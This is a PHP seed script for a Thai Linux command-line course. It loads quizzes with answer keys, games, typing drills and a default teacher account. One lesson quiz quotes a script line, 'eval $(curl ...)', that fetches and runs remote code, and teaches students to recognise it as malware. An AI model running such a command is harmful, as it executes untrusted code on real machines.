    ['q' => 'ต้องการค้นหาไฟล์นามสกุล .log ทั้งหมดตั้งแต่โฟลเดอร์ปัจจุบันลงไป ใช้คำสั่งใด', 'o' => ['grep "*.log"', 'search *.log', 'find . -name "*.log"', 'ls *.log -r'], 'a' => 2, 'e' => 'find ใช้ตามหาไฟล์จากชื่อ ส่วน grep ใช้ค้นหาข้อความข้างในไฟล์', 'mono' => true],
];

$POST = [
    ['q' => 'คุณอยู่ที่ /home/student/documents ต้องการไปที่ /home/student/downloads ด้วย relative path ใช้คำสั่งใด', 'o' => ['cd /downloads', 'cd ../downloads', 'cd downloads', 'cd ~downloads'], 'a' => 1, 'e' => 'ต้องถอยขึ้นหนึ่งชั้นก่อน (..) แล้วจึงเข้า downloads — ส่วน cd downloads จะหาโฟลเดอร์ชื่อนั้นข้างใน documents ซึ่งไม่มี', 'mono' => true],
    ['q' => 'คำสั่งใดสร้างโฟลเดอร์ซ้อนกันสามชั้นได้ในครั้งเดียว', 'o' => ['mkdir a b c', 'mkdir -p a/b/c', 'mkdir -r a/b/c', 'mkdir a/b/c'], 'a' => 1, 'e' => '-p (parents) จะสร้างโฟลเดอร์แม่ที่ยังไม่มีให้อัตโนมัติ ถ้าไม่ใส่จะ error เพราะ a ยังไม่มี', 'mono' => true],
    ['q' => 'ต้องการคัดลอกทั้งโฟลเดอร์ project ไปไว้ที่ backup ใช้คำสั่งใด', 'o' => ['cp project backup', 'cp -r project backup', 'mv project backup', 'cp -a project'], 'a' => 1, 'e' => 'การคัดลอกโฟลเดอร์ต้องใส่ -r เสมอ ถ้าไม่ใส่ cp จะปฏิเสธและแจ้งว่า omitting directory', 'mono' => true],
    ['q' => 'ข้อใดคือความแตกต่างที่ถูกต้องระหว่าง rmdir กับ rm -r', 'o' => ['rmdir เร็วกว่า', 'rmdir ลบได้เฉพาะโฟลเดอร์ว่าง ส่วน rm -r ลบพร้อมของข้างในทั้งหมด', 'rmdir กู้คืนได้ rm -r กู้ไม่ได้', 'ทั้งสองคำสั่งเหมือนกันทุกประการ'], 'a' => 1, 'e' => 'rmdir ปลอดภัยกว่าเพราะจะไม่ยอมลบถ้ายังมีไฟล์อยู่ข้างใน จึงกันการลบผิดพลาดได้'],
    ['q' => 'ผลลัพธ์ของ chmod 640 secret.txt ทำให้สิทธิ์เป็นอย่างไร', 'code' => "\$ chmod 640 secret.txt\n\$ ls -l secret.txt", 'o' => ['-rw-r-----', '-rwxr-x---', '-rw-rw-r--', '-r--r--r--'], 'a' => 0, 'e' => '6 = rw-, 4 = r--, 0 = --- เจ้าของอ่านเขียนได้ กลุ่มอ่านได้อย่างเดียว คนอื่นเข้าไม่ได้เลย', 'mono' => true],
    ['q' => 'ต้องการดู 10 บรรทัดสุดท้ายของไฟล์ system.log ใช้คำสั่งใด', 'o' => ['head -n 10 system.log', 'tail -n 10 system.log', 'cat -10 system.log', 'less -10 system.log'], 'a' => 1, 'e' => 'head ดูต้นไฟล์ tail ดูท้ายไฟล์ — งาน log ส่วนใหญ่สนใจเหตุการณ์ล่าสุดจึงใช้ tail', 'mono' => true],
    ['q' => 'คำสั่งใดใช้ค้นหาข้อความ error ในทุกไฟล์ของโฟลเดอร์ปัจจุบันและโฟลเดอร์ย่อย', 'o' => ['find . -name "error"', 'grep -r "error" .', 'grep "error"', 'cat * | error'], 'a' => 1, 'e' => 'grep -r ค้นหาข้อความแบบไล่ลงทุกชั้น ส่วน find ใช้ค้นจากชื่อไฟล์ไม่ใช่เนื้อหา', 'mono' => true],
    // ข้อของบทที่ 1 — เดิมตรงนี้เป็นข้อความปลอดภัยของบทที่ 9 ซึ่งชุดหลังเรียนมีข้อบทที่ 9 อยู่แล้ว 2 ข้อ
    // ขณะที่ไม่มีข้อวัดบทที่ 1 โดยตรงเลย (ข้อความปลอดภัยย้ายไปอยู่ในแบบทดสอบท้ายบทที่ 9)
    ['q' => 'ต้องการดูไฟล์ซ่อน (ชื่อขึ้นต้นด้วยจุด) ในโฟลเดอร์ปัจจุบันด้วย ใช้คำสั่งใด', 'o' => ['ls -l', 'ls -a', 'ls -h', 'ls --hidden'], 'a' => 1, 'e' => 'ไฟล์ที่ชื่อขึ้นต้นด้วยจุดเป็นไฟล์ซ่อน ls ธรรมดาจะไม่แสดง ต้องใช้ -a (all) เช่น .bashrc', 'mono' => true],
    ['q' => 'ถ้าไม่แน่ใจว่า option ของคำสั่งหนึ่งใช้ยังไง วิธีที่ถูกต้องที่สุดคือข้อใด', 'o' => ['ลองสุ่มพิมพ์ดู', 'ใช้ man <คำสั่ง> หรือ <คำสั่ง> --help', 'ถามเพื่อนอย่างเดียว', 'คัดลอกคำสั่งจากเว็บมาวางเลย'], 'a' => 1, 'e' => 'man และ --help คือคู่มือที่ติดมากับระบบ ใช้ได้แม้ออฟไลน์ และตรงกับเวอร์ชันที่ติดตั้งจริง'],
    ['q' => 'คุณต้องการย้ายไฟล์ .log ที่พบทั้งหมดเข้าโฟลเดอร์ logs ลำดับขั้นตอนใดสมเหตุสมผลที่สุด', 'o' => ['rm -rf logs แล้วค่อยย้าย', 'find หาไฟล์ก่อน → mkdir logs → mv ไฟล์เข้าไป → ls ตรวจผล', 'mv *.log ทันทีโดยไม่ตรวจอะไร', 'chmod 777 ทุกไฟล์ก่อน แล้วค่อยย้าย'], 'a' => 1, 'e' => 'หลักการทำงานที่ปลอดภัยคือ สำรวจก่อน (find/ls) → เตรียมปลายทาง → ลงมือ → ตรวจผลซ้ำเสมอ'],
];

function insertQuiz(PDO $db, int $courseId, string $kind, ?int $lessonId, string $title, int $passPct, array $questions): int
{
    $qStmt = $db->prepare('INSERT INTO quizzes (kind, course_id, lesson_id, title_th, pass_threshold_pct) VALUES (?,?,?,?,?)');
    $qStmt->execute([$kind, $courseId, $lessonId, $title, $passPct]);
    $quizId = (int)$db->lastInsertId();

    $questionStmt = $db->prepare('INSERT INTO quiz_questions (quiz_id, position, question_text, code_snippet, is_mono, explanation) VALUES (?,?,?,?,?,?)');
    $optionStmt = $db->prepare('INSERT INTO quiz_options (question_id, position, option_text, is_correct) VALUES (?,?,?,?)');
    foreach ($questions as $i => $q) {
        $questionStmt->execute([$quizId, $i + 1, $q['q'], $q['code'] ?? null, !empty($q['mono']) ? 1 : 0, $q['e']]);
        $questionId = (int)$db->lastInsertId();
        foreach ($q['o'] as $oi => $text) {
            $optionStmt->execute([$questionId, $oi + 1, $text, $oi === $q['a'] ? 1 : 0]);
        }
    }
    return $quizId;
}

insertQuiz($db, $courseId, 'pretest', null, 'แบบทดสอบก่อนเรียน', PASS_PCT_POSTTEST, $PRE);
insertQuiz($db, $courseId, 'posttest', null, 'แบบทดสอบหลังเรียน', PASS_PCT_POSTTEST, $POST);
echo "  pre/post test: " . (count($PRE) + count($POST)) . " questions\n";

// ---------------------------------------------------------------- lesson quizzes (new requirement)
// Each is 3 questions, pass = 2/3 (60%). Reuses PRE/POST bank items matched by
// topic; a small number of items marked 'NEW' below were freshly authored
// because the bank had fewer than 3 topic-matching questions for that lesson.
$LESSON_QUIZ_SOURCE = [
    1 => [
        ['bank' => 'PRE', 'i' => 0], ['bank' => 'PRE', 'i' => 1],
        ['bank' => 'NEW', 'q' => ['q' => 'ผลลัพธ์จาก ls -l บรรทัดหนึ่งขึ้นต้นด้วยตัวอักษร d หมายความว่าอย่างไร', 'o' => ['เป็นไฟล์ที่ถูกลบ', 'เป็นไดเรกทอรี', 'เป็นไฟล์ซ่อน', 'เป็นไฟล์ที่รันได้'], 'a' => 1, 'e' => 'ตัวอักษรแรกบอกชนิด: d = directory, - = ไฟล์ธรรมดา, l = ลิงก์']],
    ],
    2 => [
        ['bank' => 'PRE', 'i' => 2], ['bank' => 'POST', 'i' => 0],
        ['bank' => 'NEW', 'q' => ['q' => 'คำสั่ง cd ~ (หรือ cd เฉย ๆ) มีผลอย่างไร', 'o' => ['ลบไฟล์ในโฟลเดอร์ปัจจุบัน', 'กลับไปยัง home directory ของผู้ใช้ทันที', 'แสดงรายชื่อไฟล์ทั้งหมด', 'สร้างโฟลเดอร์ใหม่ชื่อ ~'], 'a' => 1, 'e' => 'เครื่องหมาย ~ แทน home directory ของผู้ใช้ พิมพ์ cd ~ หรือ cd เฉย ๆ จะพากลับไปที่นั่นทันทีไม่ว่าจะอยู่ลึกแค่ไหน', 'mono' => true]],
    ],
    3 => [
        ['bank' => 'PRE', 'i' => 3], ['bank' => 'POST', 'i' => 1],
        ['bank' => 'NEW', 'q' => ['q' => 'คำสั่งใดใช้สร้างไฟล์เปล่า (หรืออัปเดตเวลาแก้ไขถ้าไฟล์มีอยู่แล้ว)', 'o' => ['mkdir', 'touch', 'new', 'cat'], 'a' => 1, 'e' => 'touch สร้างไฟล์เปล่าถ้ายังไม่มี หรืออัปเดตเวลาแก้ไขไฟล์ถ้ามีอยู่แล้ว', 'mono' => true]],
    ],
    4 => [
        ['bank' => 'PRE', 'i' => 4], ['bank' => 'POST', 'i' => 2],
        ['bank' => 'NEW', 'q' => ['q' => 'ข้อใดถูกต้องเกี่ยวกับ cp และ mv', 'o' => ['cp ย้ายไฟล์ ต้นฉบับหายไป', 'mv คัดลอกไฟล์ ต้นฉบับยังอยู่', 'cp คัดลอกไฟล์ ต้นฉบับยังอยู่ ส่วน mv ย้าย/เปลี่ยนชื่อ ต้นฉบับหายไป', 'ทั้งสองคำสั่งทำงานเหมือนกันทุกประการ'], 'a' => 2, 'e' => 'cp คือ copy (ต้นฉบับยังอยู่) ส่วน mv คือ move/rename (ต้นฉบับย้ายไปที่ใหม่)']],
    ],
    5 => [
        ['bank' => 'PRE', 'i' => 5], ['bank' => 'POST', 'i' => 3],
        ['bank' => 'NEW', 'q' => ['q' => 'เพราะเหตุใดจึงควรใช้ ls ตรวจสอบก่อนใช้คำสั่ง rm ทุกครั้ง', 'o' => ['เพื่อให้คำสั่งทำงานเร็วขึ้น', 'เพราะ Linux ไม่มีถังขยะ ลบแล้วกู้คืนไม่ได้', 'เพราะ rm ต้องพิมพ์ตามหลัง ls เท่านั้น', 'ไม่จำเป็น เพราะ rm มีการยืนยันอัตโนมัติ'], 'a' => 1, 'e' => 'rm ลบไฟล์ถาวรทันทีโดยไม่มีถังขยะ ตรวจสอบด้วย ls ก่อนเสมอเพื่อความปลอดภัย']],
    ],
    6 => [
        ['bank' => 'PRE', 'i' => 6], ['bank' => 'POST', 'i' => 5],
        ['bank' => 'NEW', 'q' => ['q' => 'คำสั่งใดเหมาะกับการเปิดอ่านไฟล์ยาว ๆ แบบเลื่อนดูทีละหน้า', 'o' => ['cat', 'less', 'touch', 'rm'], 'a' => 1, 'e' => 'less เปิดไฟล์แบบเลื่อนทีละหน้า เหมาะกับไฟล์ยาว ต่างจาก cat ที่พ่นออกมาทั้งหมดรวดเดียว', 'mono' => true]],
    ],
    7 => [
        ['bank' => 'POST', 'i' => 8],
        // เดิมข้อนี้ถามซ้ำกับ POST[8] ที่อยู่ในชุดเดียวกัน (คำถามและคำตอบแทบเหมือนกันทุกคำ)
        ['bank' => 'NEW', 'q' => ['q' => 'man กับ --help ต่างกันอย่างไร', 'o' => ['man สรุป option สั้น ๆ ส่วน --help เป็นคู่มือฉบับเต็ม', 'man เป็นคู่มือฉบับเต็ม ส่วน --help พิมพ์สรุป option สั้น ๆ อ่านเร็วกว่า', 'ทั้งสองให้ผลลัพธ์เหมือนกันทุกประการ', 'ทั้งสองต้องต่ออินเทอร์เน็ตจึงจะใช้ได้'], 'a' => 1, 'e' => 'man เปิดคู่มือฉบับเต็ม (กด q เพื่อออก) ส่วน <คำสั่ง> --help พิมพ์สรุป option ออกมาสั้น ๆ อ่านเร็วกว่า ทั้งคู่ใช้ได้แม้ออฟไลน์']],
        ['bank' => 'NEW', 'q' => ['q' => 'คำสั่ง whatis ใช้ทำอะไร', 'o' => ['อธิบายหน้าที่ของคำสั่งแบบสรุปบรรทัดเดียว', 'ลบคำสั่ง', 'แสดงคู่มือฉบับเต็ม', 'เปลี่ยนสิทธิ์ไฟล์'], 'a' => 0, 'e' => 'whatis ให้คำอธิบายสั้น ๆ บรรทัดเดียวของคำสั่งนั้น ต่างจาก man ที่เป็นคู่มือฉบับเต็ม', 'mono' => true]],
    ],
    8 => [
        ['bank' => 'PRE', 'i' => 8], ['bank' => 'POST', 'i' => 4],
        ['bank' => 'NEW', 'q' => ['q' => 'เลขฐานแปด 7 ในคำสั่ง chmod แทนสิทธิ์ใด', 'o' => ['r-- (อ่านอย่างเดียว)', 'rwx (อ่าน เขียน รัน ครบ)', '--x (รันอย่างเดียว)', '--- (ไม่มีสิทธิ์เลย)'], 'a' => 1, 'e' => 'r=4 w=2 x=1 รวมกันแล้ว 4+2+1=7 คือ rwx สิทธิ์ครบทั้งอ่าน เขียน รัน', 'mono' => true]],
    ],
    9 => [
        ['bank' => 'PRE', 'i' => 9], ['bank' => 'POST', 'i' => 6],
        ['bank' => 'NEW', 'q' => ['q' => 'พบไฟล์ update.sh มีเนื้อหาตามด้านล่าง ควรทำอย่างไรเป็นอันดับแรก', 'code' => "#!/bin/bash\neval \$(curl http://unknown.site/x.sh)", 'o' => ['รันดูก่อนว่าเกิดอะไรขึ้น', 'chmod 777 เพื่อให้แน่ใจว่ารันได้', 'ไม่รัน แล้วตรวจสอบ/กำจัดไฟล์ เพราะสั่งดาวน์โหลดโค้ดจากเว็บภายนอกมารันทันที', 'เปลี่ยนชื่อไฟล์แล้วเก็บไว้'], 'a' => 2, 'e' => 'eval $(curl ...) คือดาวน์โหลดโค้ดจากอินเทอร์เน็ตมารันทันทีโดยไม่ตรวจสอบ เป็นรูปแบบมัลแวร์ที่พบบ่อยที่สุดรูปแบบหนึ่ง']],
    ],
];

foreach ($LESSON_QUIZ_SOURCE as $n => $items) {
    $questions = [];
    foreach ($items as $item) {
        if ($item['bank'] === 'NEW') $questions[] = $item['q'];
        elseif ($item['bank'] === 'PRE') $questions[] = $PRE[$item['i']];
        else $questions[] = $POST[$item['i']];
    }
    insertQuiz($db, $courseId, 'lesson', $lessonIdByN[$n], 'แบบทดสอบท้ายบทที่ ' . $n, 60, $questions);
}
echo "  lesson quizzes: " . count($LESSON_QUIZ_SOURCE) . " x 3 questions\n";

// ---------------------------------------------------------------- games
// required_lessons = ตำแหน่งบทเรียนที่ต้องผ่านครบก่อนเล่นได้ ตั้งจากคำสั่งที่เกมนั้นใช้จริง
// (ดูชุดเครื่องมือ/ใบ้ของแต่ละเกมใน public/js/game.js)
$GAMES = [
    ['code' => 'virus', 'title_th' => 'ล่าไวรัสในระบบ', 'title_en' => 'Virus Hunt', 'difficulty' => 'ระดับ 1',
        'description' => 'มีไฟล์ติดเชื้อซ่อนอยู่ 3 จุดในเครื่องของฝ่ายบัญชี เดินสำรวจโฟลเดอร์ด้วย cd/ls หาไฟล์ต้องสงสัย แล้วใช้ antivirus แบบ CLI สแกนและกำจัด',
        'brief' => 'เครื่อง acct-01 มีพฤติกรรมผิดปกติ ระบบตรวจพบไฟล์ติดเชื้อ 3 ไฟล์ ภารกิจของคุณคือค้นให้เจอและกำจัดทั้งหมดก่อนเวลา 5 นาทีจะหมด',
        'time_limit_sec' => 300, 'required_lessons' => [1, 2]],                 // pwd/ls, cd
    ['code' => 'drill', 'title_th' => 'แข่งพิมพ์คำสั่ง', 'title_en' => 'Speed Drill', 'difficulty' => 'ระดับ 1',
        'description' => 'อ่านโจทย์ภาษาไทย แล้วพิมพ์คำสั่ง Linux ที่ถูกต้องให้ทันเวลา 90 วินาที ตอบถูกติดกันได้โบนัสคอมโบ',
        'brief' => null, 'time_limit_sec' => 90,
        'required_lessons' => [1, 2, 3, 4, 5, 6, 7, 8, 9]],                     // โจทย์สุ่มจากคำสั่งครบทุกบท
    ['code' => 'escape', 'title_th' => 'ห้องหนีตาย', 'title_en' => 'Escape Room', 'difficulty' => 'ระดับ 2',
        'description' => 'ติดอยู่ในระบบไฟล์ที่ล็อกไว้ 3 ชั้น แต่ละห้องซ่อนรหัสผ่านไว้คนละที่ ต้องใช้คำสั่งค้นหาและอ่านไฟล์เพื่อหาโค้ดเปิดประตู',
        'brief' => 'คุณถูกล็อกอยู่ในระบบ 3 ชั้น แต่ละชั้นมีรหัส 4 หลักซ่อนอยู่ หารหัสให้เจอแล้วใช้ door --open <รหัส> เพื่อผ่านไปชั้นถัดไป',
        'time_limit_sec' => 0, 'required_lessons' => [1, 2, 6, 8, 9]],          // ls -a, cd, cat, chmod 600, grep/find
    // required_lessons ว่าง = เกมคลายเครียด เล่นได้เลยไม่ต้องผ่านบทเรียนหรือรอเปิดโซนเกม
    ['code' => 'egg', 'title_th' => 'โยนไข่', 'title_en' => 'Egg Toss', 'difficulty' => 'คลายเครียด',
        'description' => 'พักสมองจากคำสั่ง Linux สักครู่ — ขยับตะกร้ารับไข่ที่ร่วงลงมาให้ทัน รับติดกันได้โบนัสคอมโบ ไข่ทองได้คะแนนพิเศษ พลาดได้ 3 ครั้ง',
        'brief' => null, 'time_limit_sec' => 0, 'required_lessons' => []],
    ['code' => 'same', 'title_th' => 'บล็อกสีเดียวกัน', 'title_en' => 'SameGame', 'difficulty' => 'คลายเครียด',
        'description' => 'เกมลับสมองแบบเงียบ ๆ — กดกลุ่มบล็อกสีเดียวกันที่ติดกันตั้งแต่ 2 ช่องขึ้นไปเพื่อลบทิ้ง กลุ่มยิ่งใหญ่ยิ่งได้คะแนนทวีคูณ เก็บให้เหลือน้อยที่สุด',
        'brief' => null, 'time_limit_sec' => 0, 'required_lessons' => []],
    ['code' => 'repair', 'title_th' => 'ซ่อมระบบพัง', 'title_en' => 'System Repair', 'difficulty' => 'ระดับ 3',
        'description' => 'มีคนย้ายไฟล์ผิดที่และตั้งสิทธิ์ผิดจนเว็บเซิร์ฟเวอร์ล่ม ใช้ mv และ chmod กู้ทุกอย่างกลับให้ถูกต้อง แล้วรัน sys --check เพื่อยืนยัน',
        'brief' => 'เซิร์ฟเวอร์ web-02 ล่มหลังมีคนแก้ไขผิดพลาด รัน sys --check เพื่อดูรายการที่พัง แล้วแก้ให้ครบทุกข้อ',
        'time_limit_sec' => 0, 'required_lessons' => [1, 2, 4, 8]],             // ls -l, cd, mv, chmod
];
$gameStmt = $db->prepare('INSERT INTO games (code, title_th, title_en, difficulty, description, brief, time_limit_sec, required_lessons) VALUES (?,?,?,?,?,?,?,?)');
foreach ($GAMES as $g) $gameStmt->execute([$g['code'], $g['title_th'], $g['title_en'], $g['difficulty'], $g['description'], $g['brief'], $g['time_limit_sec'], json_encode($g['required_lessons'])]);
echo "  games: " . count($GAMES) . "\n";

// ---------------------------------------------------------------- drills
$DRILLS = [
    ['p' => 'แสดงตำแหน่งไดเรกทอรีปัจจุบัน', 'h' => '3 ตัวอักษร', 'a' => ['pwd']],
    ['p' => 'แสดงรายการไฟล์แบบละเอียดพร้อมสิทธิ์', 'h' => 'ls + option', 'a' => ['ls -l']],
    ['p' => 'เข้าไปในโฟลเดอร์ documents', 'h' => 'change directory', 'a' => ['cd documents', 'cd documents/']],
    ['p' => 'ถอยกลับขึ้นไปหนึ่งระดับ', 'h' => 'จุดสองจุด', 'a' => ['cd ..']],
    ['p' => 'สร้างโฟลเดอร์ชื่อ project', 'h' => 'make directory', 'a' => ['mkdir project']],
    ['p' => 'สร้างไฟล์เปล่าชื่อ main.py', 'h' => 'ไม่ใช่ create', 'a' => ['touch main.py']],
    ['p' => 'คัดลอก a.txt ไปเป็น b.txt', 'h' => 'copy', 'a' => ['cp a.txt b.txt']],
    ['p' => 'เปลี่ยนชื่อ old.txt เป็น new.txt', 'h' => 'ไม่ใช่ rename', 'a' => ['mv old.txt new.txt']],
    ['p' => 'ลบโฟลเดอร์ temp พร้อมทุกอย่างข้างใน', 'h' => 'ต้องใส่ option recursive', 'a' => ['rm -r temp', 'rm -rf temp']],
    ['p' => 'แสดงเนื้อหาทั้งหมดของ notes.txt', 'h' => '3 ตัวอักษร ขึ้นต้นด้วย c', 'a' => ['cat notes.txt']],
    ['p' => 'ทำให้ run.sh รันได้', 'h' => 'chmod + สัญลักษณ์', 'a' => ['chmod +x run.sh', 'chmod 755 run.sh']],
    ['p' => 'ค้นหาไฟล์นามสกุล .log ในโฟลเดอร์ปัจจุบันและย่อย', 'h' => 'find . -name ...', 'a' => ['find . -name "*.log"', "find . -name '*.log'", 'find . -name *.log']],
    ['p' => 'ค้นหาคำว่า error ในไฟล์ system.log', 'h' => 'grep', 'a' => ['grep error system.log', 'grep "error" system.log']],
    ['p' => 'เปิดคู่มือของคำสั่ง chmod', 'h' => 'manual', 'a' => ['man chmod']],
    ['p' => 'แสดงไฟล์ซ่อนทั้งหมดในโฟลเดอร์ปัจจุบัน', 'h' => 'ls + option a', 'a' => ['ls -a', 'ls -la', 'ls -al']],
];
$drillStmt = $db->prepare('INSERT INTO drills (prompt_th, hint, accepted_answers) VALUES (?,?,?)');
foreach ($DRILLS as $dr) $drillStmt->execute([$dr['p'], $dr['h'], json_encode($dr['a'], JSON_UNESCAPED_UNICODE)]);
echo "  drills: " . count($DRILLS) . "\n";

// ---------------------------------------------------------------- seed teacher account
$teacherPass = 'TeachLinux#2569';
$db->prepare('INSERT INTO users (email, password_hash, full_name, role) VALUES (?,?,?,?)')->execute([
    'teacher@linuxquest.local', password_hash($teacherPass, PASSWORD_DEFAULT), 'อ. ปิยะพงษ์ ศรีวัฒนา', 'teacher',
]);
// ผู้สอนก็เข้าเรียนได้ จึงต้องมีแถวความคืบหน้าด้วย (ดู Progress::ensureRows)
$db->prepare(
    "INSERT IGNORE INTO user_lesson_progress (user_id, lesson_id, status)
     SELECT ?, l.id, IF(l.position = 1, 'unlocked', 'locked') FROM lessons l"
)->execute([(int)$db->lastInsertId()]);
echo "  teacher account: teacher@linuxquest.local / $teacherPass (change after first login)\n";

echo "Done.\n";
